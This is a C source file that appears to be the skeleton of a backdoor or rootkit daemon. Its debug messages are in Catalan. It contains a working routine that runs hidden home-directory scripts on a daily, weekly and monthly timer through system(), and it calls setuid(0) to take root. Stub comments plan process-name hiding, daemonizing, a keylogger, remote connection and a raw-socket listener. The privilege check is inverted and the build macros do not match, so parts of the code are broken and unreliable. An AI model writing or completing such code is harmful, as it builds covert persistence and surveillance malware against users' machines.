#include <stdarg.h>
#include <string.h>
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <stdlib.h>

#include "../include/config.h"
#include "../include/actions.h"

int weekday;

// Debug function
__inline__ void debug(char * format, ...){
#if DEBUG
    va_list args;
    char *str;
    va_start(args, format);
    str = va_arg(args, char*);
	printf(format, str);
#endif
}

// Cron function
#if CRON
void cron(int n){
    char buffer[256];

    debug("Executant el cron daily\n");
    sprintf(buffer, HOME"/.daily");
    system(buffer);

    weekday++;
    if ((weekday % 7) == 0){
        debug("Executant el cron weekly\n");
        sprintf(buffer, HOME"/.weekly");
        system(buffer);
    }

    if ((weekday % 30) == 0){
        debug("Executant el cron monthly\n");
        sprintf(buffer, HOME"/.monthly");
        system(buffer);
        weekday = 0;
    }

    signal(SIGALRM, cron);
	// Launched every 24h
    alarm(60*60*24);
}
#endif

int main(int argc, char *argv[]) {

	// Command mode
	if (argc == 3){
		// Connect to argv[1]:argv[2]
		return 0;
	}

	// Check if we are running
	
	// Change proc name
	
	// Daemonize
#if ! DEBUG
	
#endif

	// Cron
#if CROND
    debug("Initializing crond\n");
    signal(SIGALRM, cron);
    alarm(60*60*24);
#endif

#ifdef KEYLOGGER
    debug("Initializing keylogger\n");
#endif
	
	// Privileged or unprivileged mode
	if (!getuid() && !geteuid()) {
		debug("Detected unprivileged mode, listening to ..\n.");
		// Open a socket and listen
	} else {
		debug("Detected privileged mode, openning RAW socket\n");
		// Change to root mode
	    setuid(0);
	    setreuid(0,0);
	    setgid(0);
    	setregid(0,0);

		// Open a socket and listen
	}
	
	return 0;	
}
